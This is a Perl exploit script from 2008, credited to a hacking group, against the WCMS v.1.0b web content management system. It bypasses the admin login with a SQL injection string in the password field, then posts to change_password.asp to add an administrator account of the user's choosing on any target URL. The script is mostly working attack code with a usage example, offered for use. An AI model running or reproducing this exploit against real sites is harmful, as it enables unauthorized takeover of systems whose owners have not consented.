#!/usr/bin/perl
#=================================================
# WCMS v.1.0b Arbitrary Add Admin Exploit
#=================================================
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /
#  / XXXXXX /
# (________(
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 22 September 2008
#SITE : cwh.citec.us
#
#
#####################################################
#APPLICATION : WCMS: Web Content Management System
#VERSION     : v.1.0b
#VENDOR		 : www.rgb72.com (WEB DESIGN SOLUTIONS)
######################################################
#
#Note: magic_quotes_gpc = off
#
#This Exploit will Add user to Administrator's Privilege.
#
#####################################################################
# Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos
# Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#####################################################################

use LWP;
use HTTP::Request;
use HTTP::Cookies;

print "\n==================================================\n";
print "      WCMS v.1.0b Arbitrary Add Admin Exploit \n";
print " \n";
print "         Discovered By CWH Underground \n";
print "==================================================\n";
print "                                              \n";
print "  ,--^----------,--------,-----,-------^--,   \n";
print "  | |||||||||   `--------'     |          O	\n";
print "  `+---------------------------^----------|   \n";
print "    `\_,-------, _________________________|   \n";
print "      / XXXXXX /`|     /                      \n";
print "     / XXXXXX /  `\   /                       \n";
print "    / XXXXXX /\______(                        \n";
print "   / XXXXXX /                                 \n";
print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
print " (________(                                   \n";
print "  `------'                                    \n";
print "                                              \n";

if ($#ARGV + 1 != 3)
{
   print "Usage: ./xpl.pl <Target URL> <user> <pass>\n";
   print "Ex. ./xpl.pl http://www.target.com/admin/ cwhuser cwhpass\n";
   exit();
}

$blogurl = $ARGV[0];
$user = $ARGV[1];
$pass = $ARGV[2];

$loginurl = $blogurl."index.asp";
$adduserurl = $blogurl."change_password.asp";
$post_content = "user=".$user."&pass=".$pass."&pass1=".$pass."&Submit=---+CHANGE+---";


print "\n..::Login Page URL::..\n";
print "$loginurl";
print "\n..::Add User Page URL::..\n";
print "$adduserurl\n\n";
print "..::Login Process::..\n";

$ua = LWP::UserAgent->new;
$ua->cookie_jar(HTTP::Cookies->new);
$request = HTTP::Request->new (POST => $loginurl);
$request->header (Accept-Charset => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
$request->content_type ('application/x-www-form-urlencoded');
$request->content ('user=admin&d_log=login&password=\'+or+\'a\'=\'a&imageField.x=0&imageField.y=0');
$response = $ua->request($request);
$location = $response -> header('Location');

print "\n[+]Result :: ";

if ($location =~ /admin_main.asp/)
{
   print "Login Success!!!\n";
}
else
{
   print "Login Failed!!!\n";
   exit();
}

print "\n..::Add Admin Exploit::..\n";
$request = HTTP::Request->new (POST => $adduserurl);
$request->content_type ('application/x-www-form-urlencoded');
$request->content ($post_content);
$response = $ua->request($request);

   print "\n[+]Result\n";
   print "Username :: ".$user."\n";
   print "Password :: ".$pass."\n";
   print "Role     :: Administrator\n";
   print "\nEnjoy with Bugs ;)"

# milw0rm.com [2008-09-22]